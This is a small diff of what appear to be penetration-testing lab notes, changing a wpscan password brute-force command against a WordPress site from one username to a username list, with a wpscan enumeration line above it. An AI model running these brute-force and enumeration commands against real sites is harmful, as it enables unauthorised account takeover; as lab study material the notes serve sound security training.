@@ -27,7 +27,7 @@ sudo wpscan --url http://blog.acme.com --enumerate
 ### Brute Force Attack
 
 ```bash
-wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
+wpscan --url http://ir.inlanefreight.local -P passwords.txt -U usernames.txt
 ```
 
 ***
